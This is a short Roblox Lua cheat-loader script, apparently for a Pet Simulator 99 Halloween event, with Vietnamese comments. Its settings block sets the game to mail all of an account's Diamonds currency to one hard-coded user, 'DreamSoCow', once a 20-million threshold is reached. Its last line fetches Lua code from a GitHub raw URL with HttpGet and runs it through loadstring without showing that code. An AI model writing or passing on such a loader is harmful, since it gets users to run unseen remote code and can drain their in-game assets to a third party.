wait(3)

-- ⚙️ SETTINGS
getgenv().Settings = {
    Mailing = {
        ["Diamonds"] = {
            Class = "Currency",
            Amount = "All",        -- gửi toàn bộ khi đạt ngưỡng
            MinDiamonds = 20000000 -- ngưỡng tối thiểu (ví dụ: 20 triệu)
        },
    },
    Users = {
        "DreamSoCow",  -- người nhận
    },
    ["Split Items Evenly"] = false,
    ["Only Online Accounts"] = false,
    ["Developer Mode"] = false,
    [[ THANK YOU, YOUR MOM SO FAT <3! ]]
}
-- 🧩 LOAD SCRIPTS
loadstring(game:HttpGet("https://raw.githubusercontent.com/cholacoho123/fuck.lua/refs/heads/main/halloween%20event%20p99.lua"))()
